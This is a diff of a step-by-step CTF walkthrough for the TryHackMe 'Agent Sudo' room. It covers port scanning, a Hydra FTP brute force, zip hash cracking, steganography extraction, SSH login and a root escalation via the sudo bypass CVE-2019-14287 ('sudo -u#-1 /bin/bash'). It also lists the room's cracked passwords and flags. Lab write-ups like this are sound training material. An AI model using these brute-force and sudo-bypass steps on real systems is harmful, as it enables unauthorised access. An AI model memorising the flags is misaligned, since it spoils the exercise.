@@ -2,7 +2,7 @@ All steps and concepts about CTF made on https://tryhackme.com/room/agentsudoctf
 
 1 - PortScaning
 
-    nmap -sV 10.10.86.210
+    nmap -sV 10.10.59.144
 
     PORT     STATE    SERVICE  VERSION
     21/tcp   open     ftp      vsftpd 3.0.3
@@ -10,12 +10,11 @@ All steps and concepts about CTF made on https://tryhackme.com/room/agentsudoctf
     80/tcp   open     http     Apache httpd 2.4.29 ((Ubuntu))
     3005/tcp filtered deslogin
 
-
 2 - List paths and directories with Dirb
 
-    dirb http://10.10.86.210/ 
+    dirb http://10.10.59.144/ 
 
-3 - When access the base path http://10.10.86.210/ , returns:
+3 - When access the base path http://10.10.59.144/ , returns:
 
     Dear agents,
 
@@ -28,11 +27,11 @@ All steps and concepts about CTF made on https://tryhackme.com/room/agentsudoctf
 
     You might face problem on using Firefox. Try 'user agent switcher' plugin with user agent: C
 
-5 - We can switch the user-agent value of request with BurbSuite intercepting it 
+5 - We can switch the user-agent value of request header with BurbSuite intercepting it 
 
     When edited 'User-agent: C' , returns on secret path file to be acess agent_C_attention.php
 
-6 - The http://10.10.86.210/agent_C_attention.php returns:
+6 - The http://10.10.59.144/agent_C_attention.php returns:
 
     Attention chris,
 
@@ -43,25 +42,216 @@ All steps and concepts about CTF made on https://tryhackme.com/room/agentsudoctf
 
 7 - 'chris' is one answer/flag
 
-8 - With user 'chris' , we can force brutal attack using Hydra 
+8 - With user 'chris' , we can force brutal attack on FTP using Hydra because it's tell the password is weak
 
-    hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.86.210 ftp
+    hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.59.144 ftp
 
     There is one match:
 
-    [21][ftp] host: 10.10.86.210   login: chris   password: crystal
+    [21][ftp] host: 10.10.59.144   login: chris   password: crystal
 
 9 - With user and password of ftp, lets connect
 
-    ftp chris@10.10.86.210 -p 21
+    ftp chris@10.10.59.144 -p 21
 
+10 - On ftp, there are 2 .jpg files and To_agentJ.txt contents:
 
-10.10.86.210
+    Dear agent J,
+
+    All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for 
+    you.
+
+    From,
+    Agent C
+
+11 - By viewing the “To_agentJ.txt” file the message was login password for the chris is stored in the fake picture.
+
+12 - Let understand the content of .jpg files downloading it with
+
+    mget *
+
+13 - It's possible get hide content on file with strings command
+
+    strings cutie.jpg
+    
+    The final of contents, call attention :
+ 
+    To_agentR.txt
+    W\_z#
+    2a>=
+    To_agentR.txt
+    EwwT
+
+    **** It didn't help anything, but:
+
+14 - binwalk -e cutie.png which extracted all the hidden files in it.
+
+    DECIMAL       HEXADECIMAL     DESCRIPTION
+    --------------------------------------------------------------------------------
+    0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+    869           0x365           Zlib compressed data, best compression
+
+    WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
+    34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+    34820         0x8804          End of Zip archive, footer length: 22
+
+    There is a zip file hidden
+    And finally we got the ZIP (one CTF) file but to extract the txt file need the password. 
+    Brute-force it to crack the password.
+
+15 - Go to the folder result generated of extract previous
+
+    cd _cutie.png.extracted
+
+16 - zip2john 8702.zip>output.txt This will give hash of the password in txt file
+
+17 - john --format=zip output.txt This will get us the password
+
+    Using default input encoding: UTF-8
+    Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+    Cost 1 (HMAC size) is 78 for all loaded hashes
+    Will run 2 OpenMP threads
+    Proceeding with single, rules:Single
+    Press 'q' or Ctrl-C to abort, almost any other key for status
+    Almost done: Processing the remaining buffered candidate passwords, if any.
+    Proceeding with wordlist:/usr/share/john/password.lst
+    alien            (8702.zip/To_agentR.txt)     
+    1g 0:00:00:01 DONE 2/3 (2023-02-15 15:53) 0.8403g/s 37347p/s 37347c/s 37347C/s 123456..Peter
+    Use the "--show" option to display all of the cracked passwords reliably
+    Session completed.
+
+17 - #2 Zip file password
+
+    Ans: alien
+    
+18 - Knowing the password of zip file, just unzip it: (use the password step before)
+
+    7z e 8702.zip
+
+19 - It extracted a To_agentR.txt file:
+
+    Agent C,
+
+    We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+    By,
+    Agent R
+
+20 - On site analyser (https://www.tunnelsup.com/hash-analyzer/), we analysed 'QXJlYTUx' is base64, so decode it with (https://www.base64decode.org/)
+
+    #3 steg password
+
+    Ans: Area51
+
+21 - #4 Who is the other agent (in full name)?
+
+    With the password step before
+    
+    Now only images file left is “cute-alien.jpg” so we used the “steghide” tool to retrieve hidden info
+
+    steghide extract -sf cute-alien.jpg
+
+    use Area51 as password
+
+22 - It generates a message.txt:
+
+    Hi james,
+
+    Glad you find this message. Your login password is hackerrules!
+
+    Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+    Your buddy,
+    chris
+
+23 - #4 Who is the other agent (in full name)?
+    james
+
+24 - #5 SSH password?
+
+    hackerrules 
+
+25 - Access ssh with this two previous informations
+
+    ssh james@10.10.59.144  
+
+26 - Get content of user_flag.txt on base path
+
+    b03d975e8c92a7c04146cfa7a5a313c7
+
+27 -#2 What is the incident of the photo called?
+
+    Like hint says, just search for 'foxnews Alien_autospy' on Google
+
+    https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment
+
+    The title of new says 'Roswell alien autopsy' - this is the flag
+
+#Privile Escalation
+
+28 - Log into ssh and checked for the permission the user has with “sudo -l” command.
+
+    [sudo] password for james: 
+    Matching Defaults entries for james on agent-sudo:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User james may run the following commands on agent-sudo:
+        (ALL, !root) /bin/bash
+
+29 - It's said about /bin/bash, Let's exploit it . Check the sudo -V
+
+    └─$ sudo -V       
+    Sudo version 1.8.21p2
+    Sudoers policy plugin version 1.8.21p2
+    Sudoers file grammar version 46
+    Sudoers I/O plugin version 1.8.21p2
+
+30 - On exploit https://www.exploit-db.com/ , search for this sudo version 1.8.21;
+
+    The following https://www.exploit-db.com/exploits/47502 talk about 1.8.27 - Security Bypass
+
+    Our version is smaller, and can be used
+
+31 - # (Format: CVE-xxxx-xxxx)
+
+    CVE-2019-14287
+
+32 - Run the exploit 
+
+    sudo -u#-1 /bin/bash
+
+33 - You must be logged by root now on return of whoami
+
+34 - Get the content of flag:
+
+    cat /root/root.txt
+
+    To Mr.hacker,
+
+    Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+    Your flag is 
+    b53a02f55b57d4439e3341834d70c062
+
+    By,
+    DesKel a.k.a Agent R
+
+35 - #What is the root flag?
+
+    b53a02f55b57d4439e3341834d70c062
+
+36 - #(Bonus) Who is Agent R?
+
+    DesKel
 
 Concepts:
 #PortScaning
 #Dirb
 #BurbSuite
 #Hydra
+#HashCrack and Brute-force
+#Privile Escalation
 
+Helps:
 https://infosecwriteups.com/agent-sudo-walkthrough-tryhackme-d0abf6f2c6a1
+https://medium.com/@muhduwais/tryhackme-agent-sudo-1a6f8915c74c
